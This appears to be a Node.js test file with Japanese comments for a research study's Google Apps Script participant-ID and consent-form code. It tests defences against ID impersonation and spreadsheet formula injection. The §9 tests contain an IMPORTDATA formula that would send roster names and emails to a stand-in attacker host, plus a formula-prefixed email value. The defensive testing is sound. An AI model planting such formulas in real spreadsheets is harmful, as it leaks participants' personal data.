// GSE_G1_Form_Builder.gs の **P-ID 採番と本人確認** をローカルで実測する。
// ★ 実スプレッドシートにも実メールにも一切触らない（全部スタブ）。
//
// ⚠️★★★ **ここで測るのは「直した」ではなく「なりすましを止める」である。**
//   ★ 陽性対照（正当な経路は通る）を必ず含めること。含めないと、
//     **全部 conflict にする実装でも緑になる**。
//
// ⚠️★★ **なぜ G1 にこの検査が要るのか。**
//   採番元の Phase1 ロスターは **Phase1 / G1 / O1 の共用**である
//   (`docs/o1-deletion-ledger.md:179`)。★ O1 は 2026-08-28 に本人確認を直したが、
//   ⚠️ **G1 は修正前のまま残っていた** —— G1 経由で他人の P-ID を名乗ると、
//   O1 の数週間ぶんの常時打鍵ログと同じ P-ID 空間に混ざり、
//   同意文書 §4-3 の「消えます」が履行不能になる。
//
// 実行: node Form_G1/g1_roster_test.cjs
//   ★ 第 2 引数に別の .gs を渡すと、その版を検査する（変異注入の陽性対照に使う）。
const fs = require("fs");
const vm = require("vm");
const path = require("path");

const BUILDER = process.argv[2] || path.join(__dirname, "GSE_G1_Form_Builder.gs");
const src = fs.readFileSync(BUILDER, "utf8");

let pass = 0;
let fail = 0;
const failures = [];

function ok_(msg) {
  pass++;
  console.log("  ✅ " + msg);
}
function ng_(msg) {
  fail++;
  failures.push(msg);
  console.log("  ❌ " + msg);
}
function check(cond, msg) {
  cond ? ok_(msg) : ng_(msg);
}

// ============================================================
// スタブ
// ============================================================

/** 2 次元配列を Google Sheets 風のシートに見せる。★ appendRow / getRange だけ。 */
function makeSheet(rows) {
  const data = rows.map((r) => r.slice());
  const widen = (r) => {
    while (r.length < 3) r.push("");
    return r;
  };
  data.forEach(widen);
  const sheet = {
    __rows: data,
    getLastRow: () => data.length,
    // ⚠️★ `runHeaderDiff_` が `getLastColumn()` を呼ぶ。★ 実装し忘れると
    //   `assertRunHeader_` が例外になり、⚠️ **検査が空回りしたまま緑に見える**
    //   （実際に踏んだ: `g1RecordRosterConflict_` が false を返し続けた）。
    getLastColumn: () => data.reduce((m, r) => Math.max(m, r.length), 0),
    appendRow: (r) => data.push(widen(r.slice())),
    getRange: (row, col, numRows, numCols) => {
      const nR = numRows == null ? 1 : numRows;
      const nC = numCols == null ? 1 : numCols;
      return {
        getValues: () => {
          const out = [];
          for (let i = 0; i < nR; i++) {
            const src = data[row - 1 + i] || [];
            const line = [];
            for (let j = 0; j < nC; j++) line.push(src[col - 1 + j] == null ? "" : src[col - 1 + j]);
            out.push(line);
          }
          return out;
        },
        getValue: () => {
          const src = data[row - 1] || [];
          return src[col - 1] == null ? "" : src[col - 1];
        },
        setValue: (v) => {
          while (data.length < row) data.push(widen([]));
          widen(data[row - 1]);
          data[row - 1][col - 1] = v;
        },
        getRow: () => row,
        getSheet: () => sheet,
      };
    },
  };
  return sheet;
}

function makeCtx(opts) {
  opts = opts || {};
  const logs = [];
  const sheetWrites = [];
  const lockState = { taken: 0, released: 0, fail: !!opts.lockFails };
  const ctx = {
    Logger: { log: (m) => logs.push(String(m)) },
    console,
    __logs: logs,
    __sheetWrites: sheetWrites,
    __lock: lockState,
    LockService: {
      getScriptLock: () => ({
        waitLock: () => {
          if (lockState.fail) throw new Error("lock timeout (stub)");
          lockState.taken++;
        },
        releaseLock: () => {
          lockState.released++;
        },
      }),
    },
    SpreadsheetApp: {
      openById: () => ({
        getSheetByName: (n) => (opts.sheets && opts.sheets[n]) || null,
        getUrl: () => "https://example.invalid/stub",
      }),
      flush: () => {},
    },
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: () => (opts.mgmtSheetId === undefined ? "MGMT" : opts.mgmtSheetId),
        setProperty: () => {},
      }),
    },
    FormApp: {
      ItemType: { CHECKBOX: "CHECKBOX", MULTIPLE_CHOICE: "MC", LIST: "LIST", PAGE_BREAK: "PB" },
      PageNavigationType: { CONTINUE: "CONTINUE" },
      createTextValidation: () => ({ requireTextMatchesPattern: () => ({ build: () => ({}) }) }),
      openById: () => ({}),
    },
    DriveApp: {},
    MailApp: { sendEmail: () => {} },
    GmailApp: { createDraft: () => {} },
    Session: {},
    ScriptApp: {},
    UrlFetchApp: {},
    Utilities: {},
  };
  ctx.globalThis = ctx;
  vm.createContext(ctx);
  vm.runInContext(src, ctx, { filename: BUILDER });
  return ctx;
}

// ============================================================
// §1 なりすまし — 申告 P-ID を検証なしで信用しない (起票 E-2)
// ============================================================
console.log("\n§1 申告された P-ID を検証なしで信用しないか");

{
  const ctx = makeCtx();
  // A さん = P015 / a@example.com。B さんが P015 を名乗る。
  const roster = makeSheet([
    ["P-ID", "氏名", "メール"],
    ["P015", "A", "a@example.com"],
  ]);

  const r = ctx.g1FindInPhase1Roster_(roster, { pid: "P015", email: "b@example.com" });
  check(
    r && r.conflict === true,
    "⚠️ 他人の P-ID を名乗ると conflict になる（★ 旧実装はここを素通りしていた）"
  );
  check(r && r.reason === "email-mismatch", "conflict の理由が email-mismatch である");
}

{
  const ctx = makeCtx();
  const roster = makeSheet([
    ["P-ID", "氏名", "メール"],
    ["P015", "A", "a@example.com"],
  ]);
  // ★ 陰性対照: 本人（メール一致）は通る
  const r = ctx.g1FindInPhase1Roster_(roster, { pid: "P015", email: "a@example.com" });
  check(r && !r.conflict && r.pid === "P015", "★ 本人（メール一致）は従来どおり通る（陰性対照）");
}

{
  const ctx = makeCtx();
  const roster = makeSheet([
    ["P-ID", "氏名", "メール"],
    ["P016", "C", ""], // ★ 氏名だけ先に入れた行
  ]);
  const r = ctx.g1FindInPhase1Roster_(roster, { pid: "P016", email: "c@example.com" });
  check(
    r && !r.conflict && r.pid === "P016",
    "★ **氏名が入っていて**メールが空なら申告 P-ID を採用する（正当な経路・陰性対照）"
  );
}

{
  // ⚠️★★★ **裸の行（氏名もメールも空）は申告だけで乗っ取れない**
  //   (security-checker 指摘 HIGH-1・2026-09-01)。
  //   ★ `assignG1ParticipantId()` は `appendRow([newPid])` でこの形の行を作る。
  //   ⚠️ P-ID は連番 3 桁・URL は配布済み・メール収集 OFF → **総当たりで当たる**。
  const ctx = makeCtx();
  const roster = makeSheet([
    ["P-ID", "氏名", "メール"],
    ["P017", "", ""], // ★ 手動採番が作る裸の行
  ]);
  const r = ctx.g1FindInPhase1Roster_(roster, { pid: "P017", email: "attacker@example.com" });
  check(
    r && r.conflict === true && r.reason === "bare-row-claim",
    "⚠️★★★ 裸の行（氏名も空）を名乗ると conflict になる（★ 総当たり乗っ取りを止める）"
  );
}

{
  // ★ 端から端まで: 裸の行を名乗っても **メールを書き込まれない / 受付メールが来ない**
  const roster = makeSheet([
    ["P-ID", "氏名", "メール"],
    ["P017", "", ""],
  ]);
  const ctx = submitCtx(roster, { email: "attacker@example.com", pid: "P017" });
  ctx.onG1ConsentSubmit({ response: {} });
  check(
    String(roster.__rows[1][2]).trim() === "",
    "⚠️★★★ 裸の行に **攻撃者のメールが書き込まれない**（★ 実測）"
  );
  check(ctx.__sent.length === 0, "⚠️ 裸の行を名乗っても **受付メールが届かない**");
  check(roster.__rows.length === 2, "⚠️ 行も増えない（★ 新規発番に落ちない）");
}

{
  const ctx = makeCtx();
  const roster = makeSheet([
    ["P-ID", "氏名", "メール"],
    ["", "D", "d@example.com"], // ★ P-ID 未採番でメールだけある
  ]);
  const r = ctx.g1FindInPhase1Roster_(roster, { pid: "", email: "d@example.com" });
  check(r && !r.conflict && r.pid === "", "メール一致で P-ID 空欄の行を返す（後段が採番して埋める）");
}

{
  const ctx = makeCtx();
  const roster = makeSheet([
    ["P-ID", "氏名", "メール"],
    ["まだ", "E", "e@example.com"], // ⚠️ P-ID の形が壊れている
  ]);
  const r = ctx.g1FindInPhase1Roster_(roster, { pid: "", email: "e@example.com" });
  check(
    r && r.conflict === true && r.reason === "invalid-pid-in-roster",
    "⚠️ ロスターの P-ID が `P<数字>` でないとき conflict になる（存在しない ID を案内しない）"
  );
}

{
  const ctx = makeCtx();
  const roster = makeSheet([["P-ID", "氏名", "メール"]]);
  check(
    ctx.g1FindInPhase1Roster_(roster, { pid: "P999", email: "z@example.com" }) === null,
    "未登録なら null（★ 後段が新規発番する）"
  );
}

// ============================================================
// §2 メール一致を P-ID より優先するか
// ============================================================
console.log("\n§2 照合の順序（★ メール一致が最優先）");

{
  const ctx = makeCtx();
  // ⚠️ 本人は P020 なのに、申告欄には P015（他人）を書いてしまった
  const roster = makeSheet([
    ["P-ID", "氏名", "メール"],
    ["P015", "A", "a@example.com"],
    ["P020", "F", "f@example.com"],
  ]);
  const r = ctx.g1FindInPhase1Roster_(roster, { pid: "P015", email: "f@example.com" });
  check(
    r && !r.conflict && r.pid === "P020",
    "⚠️ 申告 P-ID が他人でも、メールが一致する行（本人）を返す"
  );
}

// ============================================================
// §3 last >= 1 — 1 行だけのロスターを見落とさないか (起票 E-3)
// ============================================================
console.log("\n§3 1 行だけのロスターで既存 P-ID を見落とさないか");

{
  const ctx = makeCtx();
  const one = makeSheet([["P001", "", ""]]); // ★ 見出し無し・1 行だけ
  check(
    ctx.g1NextParticipantId_(one) === "P002",
    "⚠️ 1 行だけのロスターでも P001 を読む（★ 旧 `last > 1` は P001 を返して衝突した）"
  );
}

{
  const ctx = makeCtx();
  const normal = makeSheet([
    ["P-ID", "氏名", "メール"],
    ["P014", "", ""],
  ]);
  check(
    ctx.g1NextParticipantId_(normal) === "P015",
    "★ 2 行以上（現行ロスター）の結果は変わらない（陰性対照）"
  );
}

{
  const ctx = makeCtx();
  check(ctx.g1NextParticipantId_(makeSheet([])) === "P001", "空のロスターでは P001 から始まる");
}

// ============================================================
// §4 ロック — 手動採番もロックを通るか (起票 E-2 系)
// ============================================================
console.log("\n§4 手動採番がロックを通るか");

{
  const roster = makeSheet([
    ["P-ID", "氏名", "メール"],
    ["P014", "", ""],
  ]);
  const ctx = makeCtx({ sheets: { 参加者ロスター: roster } });
  const pid = ctx.assignG1ParticipantId();
  check(pid === "P015", "手動採番が P015 を返す");
  check(ctx.__lock.taken === 1, "⚠️ 手動採番が **ロックを取っている**（★ 旧実装は取っていなかった）");
  check(ctx.__lock.released === 1, "ロックを解放している");
}

{
  const roster = makeSheet([
    ["P-ID", "氏名", "メール"],
    ["P014", "", ""],
  ]);
  const ctx = makeCtx({ sheets: { 参加者ロスター: roster }, lockFails: true });
  let threw = false;
  try {
    ctx.assignG1ParticipantId();
  } catch (e) {
    threw = true;
  }
  check(threw, "⚠️ ロックを取れなければ throw する（★ 黙って採番しない）");
  check(
    roster.__rows.length === 2,
    "⚠️ ロック失敗時は **1 行も書いていない**（★ 実測: 行数が増えていない）"
  );
}

// ============================================================
// §5 重複検知 — 別プロジェクトとの同時採番に気づけるか (起票 T-27)
// ============================================================
console.log("\n§5 二重採番に気づけるか（★ 防げないので、せめて気づく）");

{
  const ctx = makeCtx();
  const roster = makeSheet([
    ["P-ID", "氏名", "メール"],
    ["P015", "A", "a@example.com"],
    ["P015", "B", "b@example.com"], // ⚠️ O1 が同時に採番してしまった状態
  ]);
  check(ctx.g1CountPidRows_(roster, "P015") === 2, "同じ P-ID が 2 行あることを数えられる");
  check(ctx.g1CountPidRows_(roster, "P016") === 0, "無い P-ID は 0（陰性対照）");
}

{
  // ★ 採番した直後に重複が生まれている状況を作る:
  //   ロスターに既に P015 が居るのに A 列の見え方の都合で max=14 になっている、という
  //   状況は作れないので、⚠️ ここでは appendRow 後に **同じ ID がもう 1 行ある** ケースを
  //   直接組む（★ 実際は O1 が並行して書いた行に相当する）。
  const roster = makeSheet([
    ["P-ID", "氏名", "メール"],
    ["P014", "", ""],
    ["P015", "他プロジェクトが先に書いた行", "x@example.com"],
  ]);
  // ⚠️ max は P015 なので次は P016 になる。★ 衝突を再現するため P015 を 2 回数える形で確認する。
  const ctx = makeCtx({ sheets: { 参加者ロスター: roster } });
  ctx.assignG1ParticipantId(); // → P016
  check(
    ctx.g1CountPidRows_(roster, "P016") === 1,
    "★ 正常に採番したときは重複ゼロ（陰性対照）"
  );
  const warned = ctx.__logs.some((l) => l.indexOf("行** あります") >= 0);
  check(!warned, "★ 重複が無いのに警告を出さない（⚠️ 空回りしていない対照）");
}

// ============================================================
// §6 conflict がシートに出るか（★ Logger だけにしない）
// ============================================================
console.log("\n§6 conflict が研究者の見るシートに出るか");

{
  const run = makeSheet([
    ["G1 実施トラッキング"],
    ["P-ID", "備考"],
  ]);
  const ctx = makeCtx({ sheets: { "G1 実施トラッキング": run } });
  // ★ ヘッダ検査と列引きは本体の実装に委ねる。呼べること・書けることを見る。
  let recorded = false;
  try {
    recorded = ctx.g1RecordRosterConflict_(
      { pid: "P015", row: 2, reason: "email-mismatch" },
      "b@example.com"
    );
  } catch (e) {
    recorded = "threw: " + e;
  }
  check(recorded === true || recorded === false, "g1RecordRosterConflict_ が例外を投げずに終わる");
  const logged = ctx.__logs.join("\n");
  check(
    logged.indexOf("b@example.com") < 0,
    "⚠️ ログに **実アドレスをそのまま残さない**（data-privacy）"
  );
}

{
  // ⚠️★★★ **conflict 行が「参加者 1 人」として数えられないこと。**
  //   ★ 当初 P-ID 列に `⚠要確認` を書いていたが、`submissionPids_`（:1069・「行の真実源」）が
  //   `if (pid && ...)` で拾い、⚠️ **存在しない参加者を数えていた**。→ P-ID 列は空にした。
  //
  // ⚠️★★ **端から端まで通すこと。** 最初この検査を「手で組んだシートを `submissionPids_` に
  //   渡す」形で書いたが、★ それだと `g1RecordRosterConflict_` が P-ID 列に書き戻す変異を
  //   入れても**緑のまま**だった（＝ 退行を捕まえられない）。
  //   → ★ **実際に `g1RecordRosterConflict_` に書かせてから** `submissionPids_` で数える。
  const ctx = makeCtx();
  // ★ 本物の RUN_HEADER をそのままヘッダ行(row 2)に使う。⚠️ assertRunHeader_ を通すため。
  const header = ctx.RUN_HEADER.slice();
  const blank = () => header.map(() => "");
  const rowP015 = blank();
  rowP015[0] = "P015";
  const run = makeSheet([header.map(() => ""), header, rowP015]);
  const ctx2 = makeCtx({ sheets: { "G1 実施トラッキング": run } });

  const recorded = ctx2.g1RecordRosterConflict_(
    { pid: "P015", row: 2, reason: "email-mismatch" },
    "b@example.com"
  );
  check(recorded === true, "★ conflict を実際にシートへ書けた（★ ここが false だと以下が空回り）");

  const pids = ctx2.submissionPids_(run);
  check(pids.indexOf("P015") >= 0, "★ 実在の P-ID は数える（陰性対照）");
  check(
    pids.length === 1,
    "⚠️ conflict 行が **参加者として数えられない**（★ P-ID 列を空にした理由）"
  );
  check(
    !pids.some((p) => p.indexOf("要確認") >= 0),
    "⚠️ 「要確認」の印が P-ID として混ざらない"
  );

  // ★ 人には見える形で残っていること（⚠️ 数えないことと、見えないことは違う）。
  const noteCol = ctx2.RUN_HEADER.indexOf("備考");
  const wrote = run.__rows.some(
    (r) => String(r[noteCol] || "").indexOf("要確認") >= 0
  );
  check(wrote, "★ 備考には「要確認」が残る（★ 機械は数えないが人には見える）");
  const noteText = run.__rows.map((r) => String(r[noteCol] || "")).join("\n");
  check(
    noteText.indexOf("b@example.com") < 0,
    "⚠️ 備考に **実アドレスをそのまま書かない**（data-privacy）"
  );
}

{
  const ctx = makeCtx({ mgmtSheetId: null });
  const r = ctx.g1RecordRosterConflict_({ pid: "P015", row: 2, reason: "x" }, "b@example.com");
  check(r === false, "★ 管理シートが無ければ false を返す（⚠️ 例外にして発番を巻き戻さない）");
  check(
    ctx.__logs.some((l) => l.indexOf("シートに出せません") >= 0),
    "⚠️ シートに出せなかったことを **黙らせない**"
  );
}

// ============================================================
// §7 P-ID の形式判定
// ============================================================
console.log("\n§7 P-ID の形式判定");

{
  const ctx = makeCtx();
  check(ctx.g1IsValidPid_("P015") === true, "P015 は妥当");
  check(ctx.g1IsValidPid_("p015") === true, "小文字も妥当（★ 大文字化して判定）");
  // ⚠️★★ **この検査の限界を固定する。** `^P\d+$` は**桁数を見ない**ので `P15` を通す。
  //   ★ O1 のコメントは `P15` を打ち間違いの例に挙げているが、⚠️ 実際には捕まえていない
  //     （2026-09-01 に実測）。→ 捕まえるのは「P が無い」「区切りが入る」形だけである。
  check(ctx.g1IsValidPid_("P15") === true, "⚠️ P15 は **通ってしまう**（★ 桁数を見ない・既知の限界）");
  check(ctx.g1IsValidPid_("015") === false, "015（P が無い）は妥当でない");
  check(ctx.g1IsValidPid_("p-015") === false, "p-015（区切りあり）は妥当でない");
  check(ctx.g1IsValidPid_("") === false, "空欄は妥当でない");
  check(ctx.g1IsValidPid_("まだ") === false, "日本語は妥当でない");
  check(ctx.g1IsValidPid_("P-ID") === false, "見出し行の値は妥当でない");
}

// ============================================================
// §8 ⚠️★★★ 結合 — `onG1ConsentSubmit` を**端から端まで**通す
// ============================================================
// ⚠️ 最初この検査が無かったため、**リファクタ本体が 1 行も実行されていなかった**
//   (code-reviewer 指摘 M1 / security-checker MED-3・2026-09-01)。
//   ★ H1 (空 P-ID 行の埋め戻し) / H2 (形式検証) / H3 (重複時に送る) はすべてこの関数の中にあり、
//   ⚠️ **テストが緑なのにコードが壊れている**組み合わせが実際に成立していた。
console.log("\n§8 onG1ConsentSubmit を端から端まで通す");

/** ★ 同意フォームの提出イベントを模す。⚠️ 実装は `g1ConsentAnswers_` で読む。 */
function submitCtx(roster, opts) {
  opts = opts || {};
  const sent = [];
  const notes = [];
  const ctx = makeCtx({ sheets: { 参加者ロスター: roster } });
  // ⚠️★ 備考に**何を書いたか**を捕まえる。★ これが無いと「嘘を書く」欠陥を測れない
  //   （実測: outcome を固定文に戻す変異が緑のまま素通りした）。
  ctx.__notes = notes;
  ctx.g1RecordRosterConflict_ = (found, email, outcome) => {
    notes.push(String(outcome == null ? "" : outcome));
    return true;
  };
  ctx.MailApp.sendEmail = (to, sub, body) => sent.push({ to, sub, body });
  ctx.GmailApp.createDraft = (to, sub, body) => sent.push({ to, sub, body, draft: true });
  ctx.__sent = sent;
  // ★ 回答の読み取りと本文生成は本タスクの対象外なのでスタブする
  //   （⚠️ ここを本物にすると設問 ID の有無で落ち、測りたいものが測れない）。
  ctx.g1ConsentAnswers_ = () => ({
    email: opts.email || "",
    pid: opts.pid === undefined ? "" : opts.pid,
    name: opts.name || "名無し",
    consent: true,
  });
  ctx.g1RegisterAckSubject_ = () => "受付";
  ctx.g1RegisterAckBody_ = () => "本文";
  ctx.g1MaterialsUrlForPid_ = () => ({ url: "", problem: "なし" });
  ctx.g1EnsureRunRow_ = () => null;
  ctx.g1IsConsentYes_ = () => true;
  return ctx;
}

{
  // ★ H1: P-ID が空でメールが一致する行 → **その行を埋める**（⚠️ 2 行目を作らない）
  const roster = makeSheet([
    ["P-ID", "氏名", "メール"],
    ["P014", "先客", "x@example.com"],
    ["", "D", "d@example.com"], // ★ 氏名・メールだけ先に入った行
  ]);
  const ctx = submitCtx(roster, { email: "d@example.com", pid: "" });
  try {
    ctx.onG1ConsentSubmit({ response: {} });
  } catch (e) {
    /* 本体の他の経路で落ちても、下の実測で判定する */
  }
  check(roster.__rows.length === 3, "⚠️ 行が増えていない（★ 2 行目を作らない = 1 人に 2 つの ID を作らない）");
  check(String(roster.__rows[2][0]).trim() === "P015", "★ 空だった P-ID 列が埋まった（P015）");
}

{
  // ★ H2: 形式不正な申告 ID → **何もしない**
  const roster = makeSheet([
    ["P-ID", "氏名", "メール"],
    ["P014", "先客", "x@example.com"],
  ]);
  // ⚠️★ `015`（P が無い）を使う。★ `P15` は **通る** —— `^P\d+$` は桁数を見ないため
  //   （実測。O1 のコメントは `P15` を打ち間違いの例に挙げているが、⚠️ この検査は捕まえない）。
  const ctx = submitCtx(roster, { email: "new@example.com", pid: "015" });
  ctx.onG1ConsentSubmit({ response: {} });
  check(roster.__rows.length === 2, "⚠️ 形式不正なら **1 行も書かない**");
  check(ctx.__sent.length === 0, "⚠️ 形式不正なら **受付メールを送らない**");
  check(
    ctx.__logs.some((l) => l.indexOf("形式が違います") >= 0),
    "★ 形式不正を黙らせない"
  );
}

{
  // ★ conflict: 他人の P-ID を名乗る → 発番も送信もしない
  const roster = makeSheet([
    ["P-ID", "氏名", "メール"],
    ["P015", "A", "a@example.com"],
  ]);
  const ctx = submitCtx(roster, { email: "b@example.com", pid: "P015" });
  ctx.onG1ConsentSubmit({ response: {} });
  check(roster.__rows.length === 2, "⚠️ conflict なら **ロスターに 1 行も書かない**");
  check(ctx.__sent.length === 0, "⚠️ conflict なら **受付メールを 0 通**（★ 端から端まで実測）");
}

{
  // ★ H3: 重複を検知したら **受付メールを送らない**
  const roster = makeSheet([
    ["P-ID", "氏名", "メール"],
    ["P014", "先客", "x@example.com"],
  ]);
  const ctx = submitCtx(roster, { email: "new@example.com", pid: "" });
  // ⚠️ appendRow の直後に「もう 1 行同じ ID がある」状態を作る（★ O1 が並行して書いた相当）。
  const origAppend = roster.appendRow;
  roster.appendRow = function (r) {
    origAppend.call(roster, r);
    origAppend.call(roster, [r[0], "他プロジェクトが書いた行", "z@example.com"]);
  };
  ctx.onG1ConsentSubmit({ response: {} });
  check(
    ctx.__sent.length === 0,
    "⚠️★★★ 重複を検知したら **受付メールを送らない**（★ 重複 ID は回収できない）"
  );
  check(
    ctx.__logs.some((l) => l.indexOf("受付メールは**送っていません**") >= 0),
    "★ 送らなかったことをログに残す"
  );
  // ⚠️★★★ **備考に嘘を書いていないこと。** 初版は固定文「発番も受付メールもしていません」を
  //   書いていたが、★ この経路では **発番済み**であり、⚠️ 研究者の見るシートに嘘が載っていた
  //   (code-reviewer 指摘 H3)。★ 「警告が無い＝安全」の裏返しで、**虚偽の安心**である。
  //   ⚠️ この検査が無いと、固定文へ戻す変異が**緑のまま素通りする**（実測して足した）。
  const conflictLogs = ctx.__logs.filter((l) => l.indexOf("conflict を") >= 0).join("\n");
  const wroteLie = ctx.__notes.some((n) => n.indexOf("発番も受付メールもしていません") >= 0);
  check(!wroteLie, "⚠️★★★ 備考に「発番も受付メールもしていません」という **嘘を書かない**");
  check(
    ctx.__notes.some((n) => n.indexOf("発番は済んでいます") >= 0),
    "★ 備考に「発番は済んでいる」と **本当のことを書く**"
  );
  void conflictLogs;
}

{
  // ★ 陰性対照: 正常な新規登録では **1 通送る**（⚠️ 全部止める実装でも緑にならないように）
  const roster = makeSheet([
    ["P-ID", "氏名", "メール"],
    ["P014", "先客", "x@example.com"],
  ]);
  const ctx = submitCtx(roster, { email: "new@example.com", pid: "" });
  ctx.onG1ConsentSubmit({ response: {} });
  check(roster.__rows.length === 3, "★ 正常な新規登録では 1 行増える（陰性対照）");
  check(ctx.__sent.length === 1, "★ 正常な新規登録では **受付メールを 1 通送る**（陰性対照）");
  check(String(roster.__rows[2][0]).trim() === "P015", "★ 新規は P015 になる");
}

// ============================================================
// §9 ⚠️★★★ 数式インジェクション — 共用ロスターへ生値を書かない
// ============================================================
// ⚠️ 氏名欄は自由記入。`=IMPORTDATA("…"&TEXTJOIN(",",1,B2:C200))` を書かれると、
//   ★ **研究者がロスターを開いた瞬間**に Phase1 / G1 / O1 共用の対応表が外部へ出る。
//   (security-checker 指摘 HIGH-2・2026-09-01。O1 は `o1PlainText_` で対策済みだった)
console.log("\n§9 共用ロスターへの数式インジェクション");

{
  const ctx = makeCtx();
  check(ctx.g1PlainText_("=IMPORTDATA(\"x\")").charAt(0) === "'", "= で始まる値を無害化する");
  check(ctx.g1PlainText_("+1").charAt(0) === "'", "+ で始まる値を無害化する");
  check(ctx.g1PlainText_("-1+1").charAt(0) === "'", "- で始まる値を無害化する");
  check(ctx.g1PlainText_("@A1").charAt(0) === "'", "@ で始まる値を無害化する");
  check(ctx.g1PlainText_("山田 太郎") === "山田 太郎", "★ 普通の氏名は変えない（陰性対照）");
  check(ctx.g1PlainText_("a@example.com") === "a@example.com", "★ 普通のメールは変えない（陰性対照）");

  // ⚠️★★ **マスク済みメールでも数式の起点になりうる**（実測して見つけた）。
  //   ★ `g1MaskEmail_` は先頭 1 文字を残すので、`=x@evil.com` → `=***@evil.com`。
  //   ⚠️ 備考が `⚠★要確認` で始まるおかげで今は数式にならないが、
  //     ★ それは**連結順のおかげ**にすぎない → `g1PlainText_` で包んで順序に依存させない。
  check(
    /^[=+\-@]/.test(ctx.g1MaskEmail_("=x@evil.com")),
    "⚠️ マスク済みメールが数式の起点になりうることを固定する（★ 前提の明示）"
  );
  check(
    ctx.g1PlainText_(ctx.g1MaskEmail_("=x@evil.com")).charAt(0) === "'",
    "★ それも `g1PlainText_` で無害化できる"
  );
}

{
  // ★ 端から端まで: conflict の備考セルが **数式にならない**
  const header = makeCtx().RUN_HEADER.slice();
  const run = makeSheet([header.map(() => ""), header]);
  const ctx = makeCtx({ sheets: { "G1 実施トラッキング": run } });
  const wrote = ctx.g1RecordRosterConflict_(
    { pid: "P015", row: 2, reason: "email-mismatch" },
    "=x@evil.com", // ⚠️ 数式の起点を含むメール
    "発番も受付メールもしていません。"
  );
  check(wrote === true, "★ 備考を書けた（★ ここが false だと下が空回り）");
  const noteCol = ctx.RUN_HEADER.indexOf("備考");
  const cells = run.__rows.map((r) => String(r[noteCol] || "")).filter((v) => v);
  check(
    cells.length > 0 && !cells.some((v) => /^[=+\-@\t\r]/.test(v)),
    "⚠️★ 備考セルが **数式で始まらない**（★ 連結順に依存しない）"
  );
}

{
  // ★ 端から端まで: 実際に提出させて、ロスターに数式のまま着地しないこと
  const roster = makeSheet([
    ["P-ID", "氏名", "メール"],
    ["P014", "先客", "x@example.com"],
  ]);
  const evil = '=IMPORTDATA("https://evil.example/x?d="&TEXTJOIN(",",1,B2:C200))';
  const ctx = submitCtx(roster, { email: "new@example.com", pid: "", name: evil });
  ctx.onG1ConsentSubmit({ response: {} });
  const written = String(roster.__rows[2] && roster.__rows[2][1]);
  check(
    written.charAt(0) === "'",
    "⚠️★★★ 氏名欄の数式が **無害化されてロスターに着地する**（★ 対応表の流出経路を塞ぐ）"
  );
}

// ============================================================
console.log("\n────────────────────────────────────────");
console.log("  g1_roster_test: 通過 " + pass + " 件 / 失敗 " + fail + " 件");
if (fail > 0) {
  console.log("  ❌ 失敗:");
  failures.forEach((f) => console.log("     - " + f));
  process.exit(1);
}
// ⚠️★ 検査が 1 件も走っていないのに緑になるのを防ぐ（★ 空回りの番兵）。
if (pass < 50) {
  console.log("  ❌ ★ 通過件数が少なすぎます（" + pass + " 件）。検査が読み込めていない疑い。");
  process.exit(1);
}
// ⚠️★ 行頭に空白や絵文字を置かないこと。★ `run.sh` の `guard_count` が
//   `^全 \([0-9]*\) ケース期待どおり$` で件数を読む（行頭アンカー）。
//   ⚠️ ずらすと「件数不明」と表示され、**何件走ったか分からないまま緑になる**。
console.log("全 " + pass + " ケース期待どおり");
